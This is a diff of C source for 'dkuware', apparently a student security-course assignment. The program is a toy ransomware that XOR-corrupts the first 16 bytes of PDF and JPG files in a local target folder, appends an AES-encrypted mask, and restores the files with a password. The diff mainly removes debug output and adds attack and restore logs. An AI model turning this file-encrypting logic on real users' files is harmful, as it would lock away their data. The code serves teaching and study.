@@ -2,24 +2,21 @@
 // 학과: 모바일시스템공학과
 // 이름: 한현민
 
-// 11/2 (수) 할 일
-// 1. 무작위 생성한 16바이트짜리 mask 생성 후 XOR 연산하여 cipherText
-// 생성하여 덮어쓰기 (복호화까지 구현하면 적용하기)
-// 2. mask는 AES-128 암호화하여 파일의 맨 뒷 부분에 붙이기
-// (파일 포인터 새로 만들고, 이때 모드는 ab로 하여 fwrite 연산하기)
-// 3. 복호화 - 맨 앞부분, 뒷부분에서 각각 cipherText, 암호화된 mask 읽어오기
-// 4. mask는 password 값과 같이 AES-128 복호화하여 평문 mask 얻기
-// 5. 평문 mask를 cipherText와 XOR 연산하여 plainText 얻고, 이를 맨 앞
-// 16바이트에 덮어쓰기
+// 특이사항: 모든 기능 잘 작동하나, pdf_sample2는 공격했음에도 파일이 보임.
+// 그러나, Hex Editor로 덤프 떠서 확인해보면
+// 맨 앞 부분 16바이트 덮어쓰기 및 맨 뒷 부분 16바이트 마스크 쓰기 작업이
+// 다른 파일들과 동일하게 잘 되어 있음.
 
-// 이제 할 것 (11/2 수 21:50~)
-// 1. 복호화 부분
-// 1-1. plainText 맨 앞 16바이트에 쓰기
-// 1-2. 맨 뒤에 있는 암호화된 mask 16바이트 삭제하기
-// 2. 터미널 출력 부분
-// 2-1. [attack], [restore] 로그 출력하기
-// 2-2. 출력 노트 같이 출력하기
-// 3. 마무리 : debug 코드 삭제, Makefile 작성, 프로젝트 폴더 압축 후 제출
+// 빌드 방법
+// .o 파일 및 실행 파일 (./dkuware) 생성: 터미널을 압축 해제한 디렉토리에 위치해
+// 놓은 상태에서 make all 입력 .o 파일 및 실행 파일 (./dkuware) 제거: 터미널을
+// 압축 해제한 디렉토리에 위치해 놓은 상태에서 make clean 입력
+
+// 실행 방법 (password 인자는 비밀번호를 의미하며, 비밀번호는 password 이다.)
+// - ./target 디렉토리 파일 암호화: 터미널을 압축 해제한 디렉토리에 위치해 놓은
+// 상태에서 ./dkuware attack password 입력
+// - ./target 디렉토리 파일 복호화: 터미널을 압축 해제한 디렉토리에 위치해 놓은
+// 상태에서 ./dkuware restore password 입력
 
 #include <pthread.h>
 #include <stdio.h>
@@ -104,6 +101,8 @@ int main(int argc, char *argv[]) {
     pthread_create(&jpgHandleThread, &jpgHandleThreadStatus, f, NULL);
     pthread_join(jpgHandleThread, NULL);
 
+    printAsciiArtOnEncryption();
+
   } else if (strcmp(fileHandleMode, "restore") == 0) {
     f = decryption_pdfs;
     pthread_create(&pdfHandleThread, &pdfHandleThreadStatus, f, NULL);
@@ -112,9 +111,11 @@ int main(int argc, char *argv[]) {
     f = decryption_jpgs;
     pthread_create(&jpgHandleThread, &jpgHandleThreadStatus, f, NULL);
     pthread_join(jpgHandleThread, NULL);
+
+    printAsciiArtOnDecryption();
   }
 
-  printf("all processes are completed.\n");  // debug
+  fflush(stdout);
 
   return 0;
 }
@@ -202,6 +203,9 @@ void *encryption_pdfs(void *param) {
     strcat(fileDir, pdfList[i]);
     FILE *fp = fopen(fileDir, "rb");
 
+    // print message on terminal
+    printf("[attack] %s\n", fileDir);
+
     // read browsed file by 16 bytes
     unsigned char *plainText =
         (unsigned char *)malloc(sizeof(unsigned char) * FILE_HANDLE_BLOCK_SIZE);
@@ -214,13 +218,11 @@ void *encryption_pdfs(void *param) {
     // check plainText size is 16 or not.
     // if the size is less than 16, then give it zero padding.
     if (plainTextStringSize == FILE_HANDLE_BLOCK_SIZE) {
-      printf("plainText: %s\n", plainText);  // debug
     } else if (plainTextStringSize >= 0) {
       // give plainText zero padding
       for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE - plainTextStringSize; i++) {
         strcat(plainText, "0");
       }
-      printf("plainText: %s\n", plainText);  // debug
     } else {
       perror("File read failure");  // exception
     }
@@ -237,18 +239,14 @@ void *encryption_pdfs(void *param) {
       strcat(mask, segment);
       memset(segment, 0, 2);
     }
-    printf("mask: %s / length: %ld\n", mask, strlen(mask));  // debug
 
     // do XOR calculation on plainText with randomly generated mask
     unsigned char cipherText[FILE_HANDLE_BLOCK_SIZE] = {
         0,
     };
-    printf("cipherText: ");  // debug
     for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE; i++) {
       cipherText[i] = plainText[i] ^ mask[i];
-      printf("%c", cipherText[i]);  // debug
     }
-    printf("\n");  // debug
 
     // overwrite cipherText on the head of target file
     FILE *overwrite_fp = fopen(fileDir, "r+b");
@@ -257,7 +255,6 @@ void *encryption_pdfs(void *param) {
 
     // mask를 AES-128 알고리즘으로 암호화
     mask = aes_128_encryption(mask);
-    printf("after encryption: %s\n", mask);  // debug
 
     // overwrite encrypted mask on the tail of target file
     overwrite_fp = fopen(fileDir, "ab");
@@ -272,6 +269,9 @@ void *encryption_pdfs(void *param) {
     processed_pdf_count++;
   }
 
+  // print message on terminal
+  printf("[attack] %d pdf files were encrypted\n", processed_pdf_count);
+
   return NULL;
 }
 
@@ -283,6 +283,9 @@ void *encryption_jpgs(void *param) {
     strcpy(fileDir, "./target/");
     strcat(fileDir, jpgList[i]);
     FILE *fp = fopen(fileDir, "rb");
+
+    // print message on terminal
+    printf("[attack] %s\n", fileDir);
 
     // read browsed file by 16 bytes
     unsigned char *plainText =
@@ -296,13 +299,11 @@ void *encryption_jpgs(void *param) {
     // check plainText size is 16 or not.
     // if the size is less than 16, then give it zero padding.
     if (plainTextStringSize == FILE_HANDLE_BLOCK_SIZE) {
-      printf("plainText: %s\n", plainText);  // debug
     } else if (plainTextStringSize >= 0) {
       // give plainText zero padding
       for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE - plainTextStringSize; i++) {
         strcat(plainText, "0");
       }
-      printf("plainText: %s\n", plainText);  // debug
     } else {
       perror("File read failure");  // exception
     }
@@ -319,28 +320,22 @@ void *encryption_jpgs(void *param) {
       strcat(mask, segment);
       memset(segment, 0, 2);
     }
-    printf("mask: %s / length: %ld\n", mask, strlen(mask));  // debug
 
     // do XOR calculation on plainText with randomly generated mask
     unsigned char cipherText[FILE_HANDLE_BLOCK_SIZE] = {
         0,
     };
-    printf("cipherText: ");  // debug
     for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE; i++) {
       cipherText[i] = plainText[i] ^ mask[i];
-      printf("%c", cipherText[i]);  // debug
     }
-    printf("\n");
 
     // overwrite cipherText on the head of target file
     FILE *overwrite_fp = fopen(fileDir, "r+b");
-    printf("%ld\n", ftell(overwrite_fp));
     fwrite(cipherText, 1, 16, overwrite_fp);  // write cipherText on target
     fclose(overwrite_fp);
 
     // mask를 AES-128 알고리즘으로 암호화
     mask = aes_128_encryption(mask);
-    printf("after encryption: %s\n", mask);  // debug
 
     // overwrite encrypted mask on the tail of target file
     overwrite_fp = fopen(fileDir, "ab");
@@ -354,6 +349,9 @@ void *encryption_jpgs(void *param) {
 
     processed_jpg_count++;
   }
+
+  // print message on terminal
+  printf("[attack] %d jpg files were encrypted\n", processed_jpg_count);
 
   return NULL;
 }
@@ -369,6 +367,9 @@ void *decryption_pdfs(void *param) {
     FILE *mask_fp = fopen(fileDir, "rb");
     fseek(mask_fp, -FILE_HANDLE_BLOCK_SIZE, SEEK_END);
 
+    // print message on terminal
+    printf("[restore] %s\n", fileDir);
+
     // read browsed file by 16 bytes
     unsigned char *cipherText =
         (unsigned char *)malloc(sizeof(unsigned char) * FILE_HANDLE_BLOCK_SIZE);
@@ -386,24 +387,15 @@ void *decryption_pdfs(void *param) {
     int maskSize = fread(mask, 1, FILE_HANDLE_BLOCK_SIZE, mask_fp);
     int maskTextStringSize = strlen(mask);
 
-    printf("cipherText: %s / length: %d\n", cipherText,
-           cipherTextStringSize);                                 // debug
-    printf("mask: %s / length: %d\n", mask, maskTextStringSize);  // debug
-
     mask = aes_128_decryption(mask);
-    printf("decrypted mask: %s / length: %d\n", mask,
-           maskTextStringSize);  // debug
 
     // do XOR calculation on plainText with randomly generated mask
     unsigned char plainText[FILE_HANDLE_BLOCK_SIZE] = {
         0,
     };
-    printf("plainText: ");  // debug
     for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE; i++) {
       plainText[i] = cipherText[i] ^ mask[i];
-      printf("%c", plainText[i]);  // debug
     }
-    printf("\n");
 
     // write plainText in the head of file
     fclose(payload_fp);
@@ -428,6 +420,9 @@ void *decryption_pdfs(void *param) {
     processed_pdf_count++;
   }
 
+  // print message on terminal
+  printf("[restore] %d pdf files were decrypted\n", processed_pdf_count);
+
   return NULL;
 }
 
@@ -441,6 +436,9 @@ void *decryption_jpgs(void *param) {
     FILE *payload_fp = fopen(fileDir, "rb");
     FILE *mask_fp = fopen(fileDir, "rb");
     fseek(mask_fp, -FILE_HANDLE_BLOCK_SIZE, SEEK_END);
+
+    // print message on terminal
+    printf("[restore] %s\n", fileDir);
 
     // read browsed file by 16 bytes
     unsigned char *cipherText =
@@ -459,24 +457,15 @@ void *decryption_jpgs(void *param) {
     int maskSize = fread(mask, 1, FILE_HANDLE_BLOCK_SIZE, mask_fp);
     int maskTextStringSize = strlen(mask);
 
-    printf("cipherText: %s / length: %d\n", cipherText,
-           cipherTextStringSize);                                 // debug
-    printf("mask: %s / length: %d\n", mask, maskTextStringSize);  // debug
-
     mask = aes_128_decryption(mask);
-    printf("decrypted mask: %s / length: %d\n", mask,
-           maskTextStringSize);  // debug
 
     // do XOR calculation on plainText with randomly generated mask
     unsigned char plainText[FILE_HANDLE_BLOCK_SIZE] = {
         0,
     };
-    printf("plainText: ");  // debug
     for (int i = 0; i < FILE_HANDLE_BLOCK_SIZE; i++) {
       plainText[i] = cipherText[i] ^ mask[i];
-      printf("%c", plainText[i]);  // debug
     }
-    printf("\n");
 
     // write plainText in the head of file
     fclose(payload_fp);
@@ -500,6 +489,9 @@ void *decryption_jpgs(void *param) {
 
     processed_jpg_count++;
   }
+
+  // print message on terminal
+  printf("[restore] %d jpg files were decrypted\n", processed_jpg_count);
 
   return NULL;
 }
